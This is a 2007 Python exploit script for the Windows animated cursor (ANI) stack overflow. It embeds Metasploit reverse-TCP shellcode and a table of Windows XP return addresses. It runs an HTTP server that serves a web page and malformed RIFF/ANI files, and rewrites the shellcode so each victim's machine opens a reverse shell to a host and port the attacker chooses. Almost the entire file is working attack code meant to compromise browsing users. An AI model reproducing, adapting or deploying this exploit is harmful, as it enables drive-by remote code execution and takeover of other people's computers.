#!/usr/bin/env python

#
#   $Id: win32-loadaniicon.py 4 2007-06-02 00:47:59Z ramon $
#
#   Windows Animated Cursor Stack Overflow Exploit
#   Copyright 2007 Ramon de Carvalho Valle <ramon@risesecurity.org>,
#   RISE Security <contact@risesecurity.org>
#
#   This program is free software; you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation; either version 2 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program; if not, write to the Free Software
#   Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
#

#
# Windows Animated Cursor Stack Overflow Vulnerability
# http://www.determina.com/security.research/vulnerabilities/ani-header.html
#

from BaseHTTPServer import *
from os.path import *
from random import *
from socket import *
from string import *
from struct import *
from sys import *

#
#  windows/shell_reverse_tcp - 287 bytes
#  http://www.metasploit.com
#  EXITFUNC=seh, LPORT=1234, LHOST=127.0.0.1
#
buf = \
'\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b' + \
'\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01' + \
'\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07' + \
'\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f' + \
'\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b' + \
'\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c' + \
'\x8b\x70\x1c\xad\x8b\x40\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff' + \
'\xd6\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\xff\xd0' + \
'\x68\xcb\xed\xfc\x3b\x50\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08' + \
'\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53' + \
'\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68\x7f\x00\x00\x01\x66' + \
'\x68\x04\xd2\x66\x53\x89\xe1\x95\x68\xec\xf9\xaa\x60\x57\xff' + \
'\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d\x6a' + \
'\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\x95' + \
'\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab\x68' + \
'\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51' + \
'\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff' + \
'\xd6\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04' + \
'\xff\xd6\xff\x77\xfc\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6' + \
'\xff\xd0'

# Target list
target = [ \
    # call [ebx+4]

    # Microsoft Windows XP SP2 user32.dll (5.1.2600.2622) Multi Language
    {'addr': 0x25ba, 'len': 2, 'offset': 80},

    # Microsoft Windows XP SP2 user32.dll (5.1.2600.2180) Multi Language
    {'addr': 0x25d0, 'len': 2, 'offset': 80},

    # Microsoft Windows XP SP2 userenv.dll (5.1.2600.2180) English
    {'addr': 0x769fc81a, 'len': 4, 'offset': 80},

    # Microsoft Windows XP SP2 user32.dll (5.1.2600.2180) English
    # {'addr': 0x77d825d0, 'len': 4, 'offset': 80},

    # Microsoft Windows XP SP2 userenv.dll (5.1.2600.2180) Portuguese (Brazil)
    {'addr': 0x769dc81a, 'len': 4, 'offset': 80},

    # Microsoft Windows XP SP2 user32.dll (5.1.2600.2180) Portuguese (Brazil)
    # {'addr': 0x77d625d0, 'len': 4, 'offset': 80},

    # call [esi+4]

    # Microsoft Windows XP SP1a userenv.dll English
    {'addr': 0x75a758b1, 'len': 4, 'offset': 80},

    # Microsoft Windows XP SP1a shell32.dll English
    # {'addr': 0x77441a66, 'len': 4, 'offset': 80},

    # Microsoft Windows XP userenv.dll (5.1.2600.0) Portuguese (Brazil)
    {'addr': 0x75a4579b, 'len': 4, 'offset': 80},

    # Microsoft Windows XP shell32.dll (6.0.2600.0) Portuguese (Brazil)
    # {'addr': 0x77427214, 'len': 4, 'offset': 80},
]

# Target list index
tidx = 0

def randstr(count = 1, charset = 'ascii_alpha'):
    # Set the charset
    if charset == 'ascii_alpha':
        charset = digits + ascii_uppercase + ascii_lowercase
    elif charset == 'ascii_letters':
        charset = ascii_letters
    elif charset == 'ascii_lowercase':
        charset = ascii_lowercase
    elif charset == 'ascii_uppercase':
        charset = ascii_uppercase
    elif charset == 'digits':
        charset = digits
    elif charset == 'hexdigits':
        charset = hexdigits
    elif charset == 'octdigits':
        charset = octdigits

    # Create the string
    i = 0
    str = ''

    while i < count:
        str = str + charset[randint(0, len(charset)-1)]
        i = i + 1

    return str


def riff_chunk():
    chunk_id = randstr(4)
    chunk_data = randstr(randint(1, 256)*2)
    chunk_size = pack('<L', len(chunk_data))

    return chunk_id + chunk_size + chunk_data


def riff_ani_file():
    global buf, target, tidx

    # Create the first header subchunk
    anih_a = [36, randint(1, 65535), randint(1, 65535), 0, 0, 0, 0, 0, 1]
    anih_a = pack('<%dL' % len(anih_a), *[i for i in anih_a])
    anih_a = 'anih' + pack('<L', len(anih_a)) + anih_a

    # Create the second header subchunk
    anih_b = randstr(target[tidx]['offset'])

    # Set the current indexed target
    if target[tidx]['len'] == 1:
        anih_b = anih_b + pack('<B', target[tidx]['addr'])
    elif target[tidx]['len'] == 2:
        anih_b = anih_b + pack('<H', target[tidx]['addr'])
    else:
        anih_b = anih_b + pack('<L', target[tidx]['addr'])

    anih_b = 'anih' + pack('<L', len(anih_b)) + anih_b

    # Format ID
    riff = 'ACON'

    # Random subchunks
    for i in range(randint(1, 256)):
        riff = riff + riff_chunk()

    # First header subchunk
    riff = riff + anih_a

    # Random subchunks
    for i in range(randint(1, 256)):
        riff = riff + riff_chunk()

    # Second header subchunk
    riff = riff + anih_b

    # Shellcode
    riff = riff + buf

    # File ID and length of file
    riff = 'RIFF' + pack('<L', len(riff)) + riff

    # Update the target list index
    if tidx < len(target)-1:
        tidx = tidx + 1
    else:
        tidx = 0

    return riff


def randhtml():
    global buf, target, tidx

    # Random RIFF file extensions
    extension = ['ani', 'avi', 'cdr', 'rmi', 'wav']

    # Random html document
    html = \
    '<html>\n<head>\n<title>' + \
    randstr(randint(1, 256)) + \
    '</title>\n</head>\n<body>\n'

    for i in range(randint(0, 4)):
        html = html + randstr(randint(1, 256)) + '\n'

    for i in range(len(target)):
        html = html + \
        '<div id="' + randstr(randint(4, 16)) + '" ' \
        'style="cursor: url(/' + randstr(randint(4, 16)) + '.' + \
        extension[randint(0, len(extension)-1)] + ')">\n'

        for i in range(randint(0, 4)):
            html = html + randstr(randint(1, 256)) + '\n'

        html = html + '</div>\n'

        for i in range(randint(0, 4)):
            html = html + randstr(randint(1, 256)) + '\n'

    html = html + '</body>\n</html>\n'

    return html


class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)

        if self.path == '/':
            # Send the html document
            html = randhtml()
            self.send_header('Content-Type', 'text/html; charset=UTF-8')
            self.send_header('Content-Length', str(len(html)))
            self.end_headers()
            self.wfile.write(html)
            return

        # Generate and send the RIFF file
        riff = riff_ani_file()
        self.send_header('Content-Type', 'application/octetstream')
        self.send_header('Content-Length', str(len(riff)))
        self.end_headers()
        self.wfile.write(riff)


def usage():
    print 'Usage: ./%s <http_host> <http_port> <host> <port>' \
    % basename(argv[0])


if __name__ == '__main__':
    print 'Windows Animated Cursor Stack Overflow Exploit'
    print 'Copyright 2007 RISE Security <contact@risesecurity.org>\n'

    args = argv[1:]

    if '-h' in args or '--help' in args:
        usage()
        exit()

    http_host = '0.0.0.0'
    http_port = 8080
    host = '127.0.0.1'
    port = 1234

    try:
        http_host = argv[1]
        http_port = atoi(argv[2])
        host = argv[3]
        port = atoi(argv[4])
    except:
        pass

    # Set shellcode host and port to connect to
    buf = buf[:160] + inet_aton(gethostbyname(host)) + buf[164:]
    buf = buf[:166] + pack('<H', port) + buf[168:]

    # Start the HTTP server
    server_class = HTTPServer
    httpd = server_class((http_host, http_port), RequestHandler)

    print 'Listening on %s:%s' % (http_host, http_port)

    try:
        httpd.serve_forever()
    except:
        pass

